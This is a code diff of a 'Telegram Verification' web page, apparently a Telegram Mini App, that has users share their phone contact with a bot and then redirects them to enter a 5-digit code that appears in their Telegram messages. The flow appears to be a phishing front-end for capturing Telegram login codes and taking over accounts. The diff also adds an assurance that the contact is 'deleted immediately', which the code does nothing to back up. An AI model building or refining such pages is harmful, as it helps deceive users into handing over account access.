@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -74,11 +75,6 @@
             opacity: 0.95;
         }
         
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
         .error {
             background: #ffebee;
             color: #c62828;
@@ -90,6 +86,20 @@
         }
         
         .error.show {
+            display: block;
+        }
+        
+        .success {
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .success.show {
             display: block;
         }
         
@@ -127,13 +137,6 @@
             line-height: 1.5;
         }
         
-        .success-message {
-            text-align: center;
-            color: #4CAF50;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-        
         .phone-display {
             background: #f0f0f0;
             padding: 12px;
@@ -155,22 +158,23 @@
             <!-- Initial Screen -->
             <div id="initial-screen">
                 <div class="info-box">
-                    <b>How it works:</b><br>
-                    1. Click "Share Contact" below<br>
-                    2. Telegram will open a popup<br>
-                    3. Share your contact with the bot<br>
+                    <b>How to verify:</b><br>
+                    1. Click "Share Contact"<br>
+                    2. Telegram will show a popup<br>
+                    3. Allow contact sharing<br>
                     4. OTP will be sent to your phone<br>
                     5. Enter OTP in next screen
                 </div>
                 
                 <div class="error" id="error-message"></div>
+                <div class="success" id="success-message"></div>
                 
                 <button class="btn" onclick="shareContact()" id="share-btn">
                     📞 Share My Contact
                 </button>
                 
                 <p style="text-align: center; color: #666; font-size: 14px; margin-top: 15px;">
-                    Your contact will be used only for OTP verification
+                    Your contact will be deleted immediately after processing
                 </p>
             </div>
             
@@ -178,19 +182,19 @@
             <div id="contact-screen" class="hidden">
                 <div class="info-box">
                     ✅ <b>Contact shared!</b><br>
-                    Telegram will send your contact to the bot...
+                    Telegram is sending your contact to the bot...
                 </div>
                 
                 <div class="loading">
                     <div class="loading-spinner"></div>
-                    <p>Waiting for contact to be processed...</p>
+                    <p>Waiting for OTP to be sent...</p>
                 </div>
             </div>
             
             <!-- OTP Sent Screen -->
             <div id="otp-screen" class="hidden">
-                <div class="success-message">
-                    ✅ OTP Sent Successfully!
+                <div class="success show">
+                    ✅ <b>OTP Sent Successfully!</b>
                 </div>
                 
                 <div class="phone-display" id="phone-display">
@@ -199,11 +203,11 @@
                 
                 <div class="info-box">
                     <b>5-digit OTP sent to your phone</b><br>
-                    Check your Telegram messages
+                    Check your Telegram messages for the code
                 </div>
                 
                 <button class="btn" onclick="goToOTPPage()">
-                    🔢 Enter OTP
+                    🔢 Enter OTP Now
                 </button>
             </div>
         </div>
@@ -213,26 +217,18 @@
         let userId = null;
         let checkInterval = null;
         
-        // Initialize WebApp
+        // Initialize Telegram WebApp
         document.addEventListener('DOMContentLoaded', function() {
-            // Get Telegram WebApp
-            const tg = window.Telegram?.WebApp;
+            Telegram.WebApp.ready();
+            Telegram.WebApp.expand();
             
-            if (tg) {
-                // Initialize WebApp
-                tg.expand();
-                tg.enableClosingConfirmation();
-                
-                // Get user ID from Telegram WebApp
-                const user = tg.initDataUnsafe?.user;
-                if (user && user.id) {
-                    userId = user.id;
-                    console.log('User ID from WebApp:', userId);
-                }
+            // Get user ID from Telegram WebApp
+            const user = Telegram.WebApp.initDataUnsafe?.user;
+            if (user && user.id) {
+                userId = user.id;
+                console.log('User ID from WebApp:', userId);
             } else {
                 // For testing outside Telegram
-                console.log('Running outside Telegram WebApp');
-                // Generate a test user ID
                 userId = 'test_' + Date.now();
                 console.log('Test user ID:', userId);
             }
@@ -244,41 +240,26 @@
                 return;
             }
             
-            const tg = window.Telegram?.WebApp;
+            // Show contact screen
+            document.getElementById('initial-screen').classList.add('hidden');
+            document.getElementById('contact-screen').classList.remove('hidden');
             
-            if (tg && tg.requestContact) {
-                // Show contact screen
-                document.getElementById('initial-screen').classList.add('hidden');
-                document.getElementById('contact-screen').classList.remove('hidden');
-                
-                // Request contact via Telegram WebApp API
-                tg.requestContact((contactShared) => {
-                    if (contactShared) {
-                        // User shared contact - it will be sent to the bot
-                        console.log('User agreed to share contact');
-                        // Start checking for OTP status
-                        startCheckingOTPStatus();
-                    } else {
-                        // User cancelled
-                        console.log('User cancelled contact sharing');
-                        document.getElementById('contact-screen').classList.add('hidden');
-                        document.getElementById('initial-screen').classList.remove('hidden');
-                        showError('Contact sharing cancelled');
-                    }
-                });
-            } else {
-                // Fallback for testing
-                console.log('Using fallback for testing');
-                document.getElementById('initial-screen').classList.add('hidden');
-                document.getElementById('contact-screen').classList.remove('hidden');
-                
-                // Simulate contact sharing
-                setTimeout(() => {
+            // Use Telegram.WebApp.requestContact() to ask for phone number
+            Telegram.WebApp.requestContact(function(shared) {
+                if (shared) {
+                    // User shared contact - Telegram will send it to the bot
+                    console.log('✅ User shared contact via Telegram popup');
+                    
+                    // Start checking for OTP status
+                    startCheckingOTPStatus();
+                } else {
+                    // User cancelled
+                    console.log('❌ User cancelled contact sharing');
                     document.getElementById('contact-screen').classList.add('hidden');
-                    document.getElementById('otp-screen').classList.remove('hidden');
-                    document.getElementById('phone-display').textContent = 'Phone: +1234567890 (Test)';
-                }, 2000);
-            }
+                    document.getElementById('initial-screen').classList.remove('hidden');
+                    showError('Contact sharing was cancelled');
+                }
+            });
         }
         
         function startCheckingOTPStatus() {
@@ -307,12 +288,17 @@
                             document.getElementById('contact-screen').classList.add('hidden');
                             document.getElementById('otp-screen').classList.remove('hidden');
                             document.getElementById('phone-display').textContent = `Phone: ${data.phone}`;
+                            
+                            // Auto-redirect after 3 seconds
+                            setTimeout(() => {
+                                goToOTPPage();
+                            }, 3000);
                         }
                         // If not sent yet, keep waiting
                     } else {
                         // Error
                         clearInterval(checkInterval);
-                        showError(data.error || 'Failed to process contact');
+                        showError(data.error || 'Failed to send OTP');
                         document.getElementById('contact-screen').classList.add('hidden');
                         document.getElementById('initial-screen').classList.remove('hidden');
                     }
@@ -335,6 +321,12 @@
             setTimeout(() => {
                 errorEl.classList.remove('show');
             }, 5000);
+        }
+        
+        function showSuccess(message) {
+            const successEl = document.getElementById('success-message');
+            successEl.textContent = message;
+            successEl.classList.add('show');
         }
     </script>
 </body>
